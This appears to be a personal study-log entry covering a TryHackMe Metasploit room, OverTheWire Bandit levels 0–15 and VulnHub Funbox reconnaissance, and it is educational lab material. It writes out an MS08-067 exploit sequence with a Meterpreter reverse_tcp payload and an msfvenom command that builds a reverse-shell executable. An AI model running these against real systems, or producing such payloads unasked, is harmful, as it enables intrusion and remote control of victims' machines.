### 🚀 Day 16: Metasploit | Bandit (0–15) | VulnHub Scriptkiddie
## 📌 Overview

Day 16 was a packed day of learning and practice across three platforms:

TryHackMe Metasploit Room — Focused on scanning, exploitation, Metasploit database, msfvenom payloads.

OverTheWire Bandit (levels 0 → 15) — Strengthened Linux fundamentals through practical challenges.

VulnHub: Funbox Scriptkiddie — Beginner-friendly CTF-style machine, performed initial recon and setup.

## 🔹 TryHackMe — Metasploit Room
Key Topics

Scanning targets with Metasploit

Using the Metasploit database (msfdb)

Conducting vulnerability scans

Exploiting vulnerable services

Generating payloads with msfvenom

Obtaining a Meterpreter session

## Important Commands

# Start and initialize the Metasploit database
msfdb init

# Launch Metasploit
msfconsole

# Database-related commands
db_status
workspace -a tryhackme_lab
hosts
services

# Scan target host
use auxiliary/scanner/portscan/tcp
set RHOSTS <target_ip>
set PORTS 1-1000
run

# Example exploit usage
search ms08_067
use exploit/windows/smb/ms08_067_netapi
set RHOSTS <target_ip>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
run

# Generate payload with msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f exe > shell.exe

## 🔹 OverTheWire — Bandit (Level 0 → 15)
Focus Areas

SSH basics

File permissions

Hidden files & directories

Encodings (base64, hex, gzip, bzip2)

Cron jobs

Password retrieval logic

## Important Commands

# SSH into Bandit
ssh bandit0@bandit.labs.overthewire.org -p 2220

# Find hidden files
ls -la

# View file contents
cat <filename>

# Read the first line
head -n 1 <filename>

# Read the last line
tail -n 1 <filename>

# Base64 decode
cat data.txt | base64 -d

# Hex dump & reverse
xxd -r file.hex > file.out

# Search by permissions
find / -user bandit7 -group bandit6 -size 33c 2>/dev/null

# Connect via nc
nc <host> <port>

## 🔹 VulnHub — Funbox: Scriptkiddie
Setup

Downloaded & imported Funbox11.ova

Added entry to /etc/hosts:

funbox11  <target_ip>


Works better with VirtualBox

## Initial Recon
# Host discovery
nmap -sn <target_network>/24

# Full port scan
nmap -p- -T4 <target_ip>

# Service and version detection
nmap -sV -sC -p <ports> <target_ip>

# Add entry for convenience
echo "<target_ip> funbox11" | sudo tee -a /etc/hosts

## 🔑 Key Takeaways

Metasploit is more than just an exploitation tool — its database & msfvenom features make it a full pentest framework.

Bandit reinforces Linux fundamentals that are critical in real-world scenarios.

VulnHub challenges simulate attacker workflows and build applied experience.

## 🛡️ High-Level Mitigations

Keep systems patched (avoid unpatched services like MS08-067 / MS17-010).

Restrict unnecessary services and enforce least privilege.

Secure SSH: disable root login, prefer key-based authentication.

Apply defense-in-depth to minimize exposed attack surfaces.

